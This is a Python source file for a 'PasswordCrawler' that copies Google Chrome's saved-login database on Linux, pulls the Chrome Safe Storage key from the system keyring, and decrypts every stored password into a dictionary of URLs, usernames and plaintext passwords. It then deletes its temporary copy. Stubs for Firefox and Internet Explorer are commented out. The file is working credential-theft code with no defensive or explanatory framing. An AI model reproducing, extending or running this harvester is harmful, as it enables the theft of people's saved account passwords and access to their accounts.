import sqlite3
import os
from shutil import copy
import string
from getpass import getuser
from importlib import import_module
from os import unlink
import secretstorage
import platform
if platform.system() == 'Linux':
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Cipher import AES


class Chrome:
    def __init__(self):
        self.username = getuser()
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
        copy(self.dbpath + "Login Data", "Login Data.db")
        self.conn = sqlite3.connect("Login Data.db")
        self.cursor = self.conn.cursor()
        self.cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        self.MY_PASS = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                self.MY_PASS = item.get_secret()
                break

    def decrypt_func(self, encrypted_passwd):
        encrypted_passwd = encrypted_passwd[3:]
        salt = b'saltysalt'
        iv = b' ' * 16
        length = 16
        iterations = 1
        key = PBKDF2(self.MY_PASS, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted_passwd)
        return decrypted.strip().decode('utf8')


    def clean(self, x):
        return x[:-x[-1]].decode('utf8')

    def dump_chrome(self):
      rec = {'chrome': []}
      for result in self.cursor.fetchall():
          _passwd = self.decrypt_func(result[2])
          passwd = ''.join(i for i in _passwd if i in string.printable)
          if result[1] or passwd:
              _rec = {}
              _rec['url'] = result[0]
              _rec['username'] = result[1]
              _rec['password'] = passwd
              rec['chrome'].append(_rec)
      self.conn.close()
      unlink("Login Data.db")
      return rec


# class Firefox(): ...


# class IE() ...


class PasswordCrawler:
    def __init__(self):
      self.chrome = Chrome()
      # self.firefox = Firefox()
      # self.IE ose Edge = ()

    def dump_passwords(self):
      passwords = self.chrome.dump_chrome()
      # passwords = passwords.update(self.firefox.dump_firefox())
      # passwords = passwords.update(self.ie.dump_ie()) 
      return passwords
